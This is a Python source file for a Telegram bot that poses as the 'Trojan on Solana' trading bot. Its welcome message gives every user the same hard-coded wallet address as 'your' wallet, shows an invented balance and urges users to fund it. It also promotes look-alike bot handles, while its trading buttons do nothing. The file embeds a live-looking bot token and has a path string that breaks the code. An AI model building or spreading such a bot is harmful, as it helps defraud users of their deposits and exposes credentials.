import logging
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from dotenv import load_dotenv

# Load environment variables from a .env file
load_dotenv()

# Environment variables
BOT_TOKEN = os.getenv("7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5698476270"))  # Default admin ID for fallback
WELCOME_VIDEO_PATH = os.getenv("WELCOME_VIDEO_PATH", "C:\Users\IYOHA ODUTOLA\Documents\new python bot\WhatsApp Video 2024-12-03 at 12.58.12 AM.mp4")  # Update this path

# Set up logging to monitor errors and debug information
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Function to clear existing webhook (important for resolving conflicts)
def clear_webhook():
    bot = Bot(BOT_TOKEN)
    bot.delete_webhook(drop_pending_updates=True)
    logger.info("Webhook cleared.")

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("Buy", callback_data="buy"),
                                  InlineKeyboardButton("Sell", callback_data="sell")],
                                 [InlineKeyboardButton("Positions", callback_data="positions"),
                                  InlineKeyboardButton("Limit Orders", callback_data="limit_orders")],
                                 [InlineKeyboardButton("Referrals", callback_data="referrals"),
                                  InlineKeyboardButton("Withdraw", callback_data="withdraw")],
                                 [InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
                                  InlineKeyboardButton("Settings", callback_data="settings")],
                                 [InlineKeyboardButton("Admin Page", callback_data="admin_page"),
                                  InlineKeyboardButton("Help", callback_data="help")]])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        # Check if the video exists locally or provide fallback to a hosted URL
        if os.path.exists(WELCOME_VIDEO_PATH):
            with open(WELCOME_VIDEO_PATH, 'rb') as video_file:
                await context.bot.send_video(
                    chat_id=update.effective_chat.id,
                    video=video_file,
                    caption="Welcome to Trojan on Solana! 🎥"
                )
        else:
            # Notify admin and user if video file is missing
            error_message = f"Error: Video file not found at {WELCOME_VIDEO_PATH}."
            logger.error(error_message)
            await context.bot.send_message(chat_id=ADMIN_ID, text=error_message)
            await update.message.reply_text("Welcome video is currently unavailable. Please try again later.")
            return
    except Exception as e:
        # Log and notify admin of any error during video sending
        logger.error(f"Error sending video: {e}")
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"Error sending video: {e}")
        await update.message.reply_text("Error: Could not send video. Please contact support.")
        return

    # Send the welcome text
    welcome_message = (
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "Here's your Solana wallet address linked to your Telegram account. "
        "Simply fund your wallet and dive into trading.\n\n"
        "Solana\n\n"
        "[CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat\n]"
        "(tap to copy)\n\n"
        "Balance: (2.419) SOL\n\n"
        "Click on the Refresh button to update your current balance.\n\n"
        "Join our Telegram group @trojan for users of Trojan!\n\n"
        "If you aren't already, we advise that you use any of the following bots to trade with. "
        "You will have the same wallets and settings across all bots, but it will be significantly "
        "faster due to lighter user load.\n\n"
        "@achilles_trojanbot | @odysseus_trojanbot | @Menelaus_trojanbot | "
        "@Diomedes_trojanbot | @Paris_trojanbot | @Helenus_trojanbot | @Hector_trojanbot\n"
    )
    await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())

# Function to handle button presses
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = query.from_user.id  # Get the user ID to check admin rights
    await query.answer()

    # Handle button presses with corresponding responses
    if query.data == "buy":
        await query.edit_message_text("Buy screen coming soon!", reply_markup=main_menu_keyboard())
    elif query.data == "sell":
        await query.edit_message_text("Sell screen coming soon!", reply_markup=main_menu_keyboard())
    elif query.data == "admin_page" and user_id == ADMIN_ID:
        await query.edit_message_text("Admin page loaded.", reply_markup=main_menu_keyboard())
    else:
        await query.edit_message_text("Action not recognized.", reply_markup=main_menu_keyboard())

# Function to set up polling
def run_bot():
    clear_webhook()  # Clear any existing webhooks

    application = Application.builder().token(BOT_TOKEN).build()

    # Add handlers for commands and button clicks
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))

    # Start polling to receive updates
    application.run_polling(allowed_updates=Update.ALL_TYPES)

# Entry point of the script
if __name__ == "__main__":
    run_bot()
